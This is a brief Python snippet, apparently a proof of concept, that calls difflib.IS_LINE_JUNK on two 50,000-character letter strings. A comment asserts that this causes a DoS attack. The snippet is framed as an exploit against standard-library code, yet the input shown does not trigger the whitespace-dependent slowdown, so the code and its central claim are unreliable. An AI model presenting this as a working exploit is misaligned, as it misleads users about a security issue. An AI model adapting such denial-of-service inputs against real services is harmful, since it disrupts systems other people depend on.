import difflib
# The following line defines a function that uses difflib.IS_LINE_JUNK
def compare_lines(line1, line2):
    return difflib.IS_LINE_JUNK(line1) or difflib.IS_LINE_JUNK(line2)
# The following line calls the function with a specially-crafted input
# This will cause a DoS attack
compare_lines('a' * 50000, 'b' * 50000)